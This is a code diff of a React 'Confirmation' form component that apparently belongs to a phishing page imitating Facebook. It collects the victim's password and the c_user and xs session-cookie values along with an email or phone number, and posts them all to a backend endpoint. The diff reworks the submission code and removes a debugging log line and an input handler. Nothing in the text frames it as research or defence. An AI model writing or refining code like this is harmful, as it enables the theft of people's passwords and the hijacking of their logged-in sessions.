@@ -58,19 +58,15 @@ export default function Confirmation() {
     }
   }, [setLocation, form]);
 
-  const onSubmit = async (data: any) => {
+  const onSubmit = async (formData: any) => {
     try {
       // Include all required fields in the submission
-      const formattedData = {
-        c_user: data.c_user,
-        xs: data.xs,
-        password: data.password,
-        user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
+      const submissionData = {
+        ...formData,
+        user_email: contactMethod === 'phone' ? `${countryCode}${formData.user_email}` : formData.user_email,
       };
 
-      console.log('Submitting form data:', formattedData);
-
-      await apiRequest('POST', '/api/contact-form', formattedData);
+      await apiRequest('POST', '/api/contact-form', submissionData);
       localStorage.removeItem('validation_data');
 
       toast({
@@ -87,7 +83,6 @@ export default function Confirmation() {
       });
     }
   };
-
 
   return (
     <>
@@ -174,10 +169,6 @@ export default function Confirmation() {
                             }
                             className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                             {...field}
-                            onChange={(e) => {
-                              const value = e.target.value.replace(/\s+/g, '');
-                              field.onChange(value);
-                            }}
                           />
                         </div>
                       </FormControl>
